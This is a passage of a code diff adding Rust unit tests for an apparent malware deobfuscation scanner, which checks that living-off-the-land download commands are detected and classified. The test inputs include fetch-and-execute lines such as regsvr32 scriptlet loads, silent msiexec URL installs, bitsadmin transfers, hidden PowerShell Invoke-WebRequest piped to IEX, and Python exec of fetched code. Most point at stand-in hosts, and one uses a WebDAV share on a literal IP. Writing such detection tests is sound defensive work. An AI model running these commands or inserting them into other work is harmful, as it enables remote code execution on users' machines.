+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "http://regsvr32-scriptlet.example/payload.sct";
+        let line = format!(r#"regsvr32 /s /n /u /i:{url} scrobj.dll"#);
+        crate::deob_scan::scan_deob_text(&line, &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UrlArgument { url: got, .. } if got == url
+            )
+        });
+        assert!(has, "regsvr32 scriptlet URL not typed: {:?}", env.traits);
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "regsvr32" && cmd == &line)
+            ),
+            "regsvr32 scriptlet URL not marked as LOLBAS: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "regsvr32 scriptlet URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn regsvr32_schemeless_scriptlet_url_in_deob_text_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"regsvr32 /s /n /u /i:regsvr32-schemeless-deob.example/payload.sct scrobj.dll"#,
+            &mut env,
+        );
+        let url = "http://regsvr32-schemeless-deob.example/payload.sct";
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UrlArgument { url: got, .. } if got == url
+            )
+        });
+        assert!(
+            has,
+            "regsvr32 schemeless scriptlet URL not typed: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "regsvr32 schemeless scriptlet URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn regsvr32_downloaded_load_target_in_deob_text_resolves_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::Download {
+            cmd: "curl -o stage.dll https://regsvr32-deob-load.example/stage.dll".to_string(),
+            src: "https://regsvr32-deob-load.example/stage.dll".to_string(),
+            dst: Some("stage.dll".to_string()),
+        });
+        crate::deob_scan::scan_deob_text("regsvr32 /s stage.dll", &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "regsvr32 /s stage.dll"
+                            && url == "https://regsvr32-deob-load.example/stage.dll"
+                )
+            }),
+            "regsvr32 downloaded load target in deob text was not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn regsvr32_webdav_target_in_deob_text_resolves_http_url() {
+        let report = crate::analyze(
+            br#"start powershell.exe -windowstyle hidden net use \\45.9.74.36@8888\davwwwroot\  regsvr32 /s \\45.9.74.36@8888\davwwwroot\163141239210479.dll"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd.contains(r#"regsvr32 /s \\45.9.74.36@8888\davwwwroot\163141239210479.dll"#)
+                            && url == "http://45.9.74.36:8888/163141239210479.dll"
+                )
+            }),
+            "regsvr32 WebDAV target in deob text was not typed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn msiexec_url_package_argument_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "https://msiexec-package.example/setup.msi";
+        let line = format!(r#"msiexec /quiet /i "{url}""#);
+        crate::deob_scan::scan_deob_text(&line, &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UrlArgument { url: got, .. } if got == url
+            )
+        });
+        assert!(has, "msiexec package URL not typed: {:?}", env.traits);
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "msiexec" && cmd == &line)
+            ),
+            "msiexec package URL not marked as LOLBAS: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "msiexec package URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn msiexec_attached_install_url_in_deob_text_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "https://msiexec-attached-deob.example/setup.msi";
+        crate::deob_scan::scan_deob_text(&format!(r#"msiexec /quiet /i{url}"#), &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UrlArgument { url: got, .. } if got == url
+            )
+        });
+        assert!(
+            has,
+            "msiexec attached package URL not typed: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "msiexec attached package URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn msiexec_schemeless_package_url_in_deob_text_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"msiexec /quiet /i msiexec-schemeless-deob.example/setup.msi"#,
+            &mut env,
+        );
+        let url = "http://msiexec-schemeless-deob.example/setup.msi";
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UrlArgument { url: got, .. } if got == url
+            )
+        });
+        assert!(
+            has,
+            "msiexec schemeless package URL not typed: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "msiexec schemeless package URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn msiexec_attached_schemeless_package_url_in_deob_text_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"msiexec /quiet /imsiexec-attached-schemeless-deob.example/setup.msi"#,
+            &mut env,
+        );
+        let url = "http://msiexec-attached-schemeless-deob.example/setup.msi";
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UrlArgument { url: got, .. } if got == url
+            )
+        });
+        assert!(
+            has,
+            "msiexec attached schemeless package URL not typed: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "msiexec attached schemeless package URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn msiexec_downloaded_package_in_deob_text_resolves_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::Download {
+            cmd: "curl -o setup.msi https://msiexec-deob-local.example/setup.msi".to_string(),
+            src: "https://msiexec-deob-local.example/setup.msi".to_string(),
+            dst: Some("setup.msi".to_string()),
+        });
+        crate::deob_scan::scan_deob_text("msiexec /i setup.msi /qn", &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "msiexec /i setup.msi /qn"
+                            && url == "https://msiexec-deob-local.example/setup.msi"
+                )
+            }),
+            "msiexec downloaded package in deob text was not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn msiexec_downloaded_patch_in_deob_text_resolves_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::Download {
+            cmd: "curl -o update.msp https://msiexec-deob-patch.example/update.msp".to_string(),
+            src: "https://msiexec-deob-patch.example/update.msp".to_string(),
+            dst: Some("update.msp".to_string()),
+        });
+        crate::deob_scan::scan_deob_text("msiexec /p update.msp /qn", &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "msiexec /p update.msp /qn"
+                            && url == "https://msiexec-deob-patch.example/update.msp"
+                )
+            }),
+            "msiexec downloaded patch in deob text was not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certreq_config_url_in_deob_text_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "https://certreq-deob.example/submit";
+        let line = format!(r#"certreq -Post -config "{url}" request.req response.txt"#);
+        crate::deob_scan::scan_deob_text(&line, &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { url: got, .. } if got == url
+                )
+            }),
+            "certreq config URL not typed in deob text: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "certreq" && cmd == &line)
+            ),
+            "certreq config URL not marked as LOLBAS in deob text: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "certreq config URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certreq_attached_config_url_in_deob_text_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "https://certreq-attached-deob.example/submit";
+        crate::deob_scan::scan_deob_text(
+            &format!(r#"certreq.exe /f /config:{url} request.req response.txt"#),
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { url: got, .. } if got == url
+                )
+            }),
+            "certreq attached config URL not typed in deob text: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "certreq attached config URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn desktopimgdownldr_lockscreenurl_in_deob_text_emits_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "https://desktopimg-deob.example/a.jpg";
+        let line = format!(r#"desktopimgdownldr.exe /lockscreenurl:{url} /eventName:test"#);
+        crate::deob_scan::scan_deob_text(&line, &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: None, .. } if src == url
+                )
+            }),
+            "desktopimgdownldr lockscreen URL not typed in deob text: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "desktopimgdownldr" && cmd == &line)
+            ),
+            "desktopimgdownldr lockscreen URL not marked as LOLBAS in deob text: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "desktopimgdownldr URL double-emitted as generic: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn certoc_getcacaps_url_in_deob_text_emits_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "https://certoc-deob.example/stage.ps1";
+        let line = format!(r#"certoc.exe -GetCACAPS "{url}""#);
+        crate::deob_scan::scan_deob_text(&line, &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: None, .. } if src == url
+                )
+            }),
+            "certoc GetCACAPS URL not typed in deob text: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "certoc" && cmd == &line)
+            ),
+            "certoc GetCACAPS URL not marked as LOLBAS in deob text: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "certoc GetCACAPS URL double-emitted as generic: {:?}",
             env.traits
         );
     }
@@ -9383,6 +23422,42 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn deob_text_embedded_powershell_iwr_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"w.Run "!powershell -WindowStyle Hidden -Nologo -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri https://embedded-ps.example/fp.ps1 -UseBasicParsing | IEX ""!", 0, False"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://embedded-ps.example/fp.ps1"
+            )
+        });
+        assert!(
+            has,
+            "embedded PowerShell IWR URL not typed as Download: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://embedded-ps.example/fp.ps1"
+                )
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "embedded PowerShell IWR URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn telegram_bot_prefix_of_known_download_not_double_emitted() {
         let mut env = crate::env::Environment::new(&Config::default());
         env.traits.push(Trait::Download {
@@ -9415,10 +23490,8 @@ $urlzip = "https://ps.example/stage.zip""#,
     #[test]
     fn bitsadmin_transfer_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
-        crate::deob_scan::scan_deob_text(
-            r#"bitsadmin /transfer j1 /download /priority foreground "https://bits.example/a.txt" "C:\Temp\a.exe" "https://bits.example/b.txt" "C:\Temp\b.exe""#,
-            &mut env,
-        );
+        let line = r#"bitsadmin /transfer j1 /download /priority foreground "https://bits.example/a.txt" "C:\Temp\a.exe" "https://bits.example/b.txt" "C:\Temp\b.exe""#;
+        crate::deob_scan::scan_deob_text(line, &mut env);
         for expected in ["https://bits.example/a.txt", "https://bits.example/b.txt"] {
             let has = env.traits.iter().any(|t| {
                 matches!(t,
@@ -9431,6 +23504,13 @@ $urlzip = "https://ps.example/stage.zip""#,
                 env.traits
             );
         }
+        assert!(
+            env.traits.iter().any(
+                |t| matches!(t, Trait::Lolbas { name, cmd } if name == "bitsadmin" && cmd == line)
+            ),
+            "bitsadmin transfer not marked as LOLBAS in deob text: {:?}",
+            env.traits
+        );
         let generic_count = env
             .traits
             .iter()
@@ -9464,6 +23544,27 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn bitsadmin_quoted_query_ampersand_in_deob_text_is_not_command_separator() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"bitsadmin /transfer j1 /download /priority foreground "https://bits-query.example/a.exe?x=1&y=2" "C:\Temp\a.exe""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "https://bits-query.example/a.exe?x=1&y=2"
+                        && dst == "C:\\Temp\\a.exe"
+            )
+        });
+        assert!(
+            has,
+            "no structured bitsadmin download preserving quoted query ampersand: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn bitsadmin_schemeless_domain_path_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -9479,6 +23580,58 @@ $urlzip = "https://ps.example/stage.zip""#,
         assert!(
             has,
             "no structured schemeless bitsadmin download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn bitsadmin_addfile_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"bitsadmin /addfile "job1" "https://bits-addfile.example/payload.exe" "C:\Temp\payload.exe""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::BitsadminDownload { url, dst }
+                    if url == "https://bits-addfile.example/payload.exe"
+                        && dst == "C:\\Temp\\payload.exe"
+            )
+        });
+        assert!(
+            has,
+            "no structured bitsadmin addfile download: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src.contains("bits-addfile.example")))
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "bitsadmin addfile URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn bitsadmin_downloaded_hta_in_deob_text_resolves_mshta_source_url() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            "bitsadmin /transfer j1 /download https://bits-mshta.example/payload.hta C:\\Temp\\payload.hta\r\nmshta C:\\Temp\\payload.hta",
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta C:\\Temp\\payload.hta"
+                            && url == "https://bits-mshta.example/payload.hta"
+                )
+            }),
+            "bitsadmin-downloaded HTA in deob text was not linked to mshta: {:?}",
             env.traits
         );
     }
@@ -9515,6 +23668,914 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn python_httpx_get_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import httpx; exec(httpx.get('https://py.example/httpx-get').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/httpx-get" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python httpx.get: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/httpx-get")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python httpx.get URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_httpx_module_alias_post_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import httpx as hx; exec(hx.post('https://py.example/httpx-alias-post').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/httpx-alias-post" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python httpx module alias post: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/httpx-alias-post")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python httpx module alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_httpx_import_alias_get_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "from httpx import get as fetch; exec(fetch('https://py.example/httpx-import-alias').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/httpx-import-alias" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python httpx get import alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/httpx-import-alias")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python httpx get import alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_httpx_assigned_get_alias_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import httpx; fetch = httpx.get; exec(fetch('https://py.example/httpx-assigned-alias').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/httpx-assigned-alias" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python httpx assigned get alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/httpx-assigned-alias")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python httpx assigned get alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_httpx_bound_client_get_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import httpx; c = httpx.Client(); exec(c.get('https://py.example/httpx-bound-client').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/httpx-bound-client" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python bound httpx.Client().get: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/httpx-bound-client")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python bound httpx.Client().get URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_httpx_client_get_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import httpx; exec(httpx.Client().get('https://py.example/httpx-client').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/httpx-client" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python httpx.Client().get: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/httpx-client")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python httpx.Client().get URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_httpx_imported_client_alias_get_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "from httpx import Client as H; c = H(); exec(c.get('https://py.example/httpx-imported-client').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/httpx-imported-client" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python imported httpx Client alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/httpx-imported-client")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python imported httpx Client alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_httpx_bound_client_assigned_post_alias_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import httpx; c = httpx.Client(); send = c.post; exec(send('https://py.example/httpx-bound-client-assigned').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/httpx-bound-client-assigned" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python assigned bound httpx.Client().post alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/httpx-bound-client-assigned")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python assigned bound httpx.Client().post alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_get_adjacent_string_literals_emit_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; requests.get('https://' 'py.example/adjacent')""#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: None, .. }
+                        if src == "https://py.example/adjacent"
+                )
+            }),
+            "no structured Download from Python adjacent string literals: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://py.example/adjacent"
+                )
+            }),
+            "Python adjacent literal URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_get_adjacent_string_variable_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; u='https://' 'py.example/adjacent-var'; requests.get(u)""#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: None, .. }
+                        if src == "https://py.example/adjacent-var"
+                )
+            }),
+            "no structured Download from Python adjacent literal variable URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_module_alias_get_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests as rq; exec(rq.get('https://py.example/requests-alias').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/requests-alias" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python requests module alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/requests-alias")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python requests module alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_get_import_alias_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "from requests import get as fetch; exec(fetch('https://py.example/requests-import-alias').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/requests-import-alias" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python requests get import alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/requests-import-alias")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python requests get import alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_assigned_get_alias_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; fetch = requests.get; exec(fetch('https://py.example/assigned-get').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/assigned-get" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python assigned requests.get alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/assigned-get")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python assigned requests.get alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_assigned_post_alias_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; send = requests.post; exec(send('https://py.example/assigned-post').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/assigned-post" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python assigned requests.post alias: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/assigned-post")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python assigned requests.post alias URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_get_variable_url_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; u = 'https://py.example/var-get'; exec(requests.get(u).text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/var-get" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python requests.get variable URL: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/var-get")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python requests.get variable URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn python_requests_module_alias_assigned_get_alias_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests as rq; fetch = rq.get; exec(fetch('https://py.example/module-assigned-get').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/module-assigned-get" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python assigned requests module alias get: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/module-assigned-get")
+            })
+            .count();
+        assert_eq!(
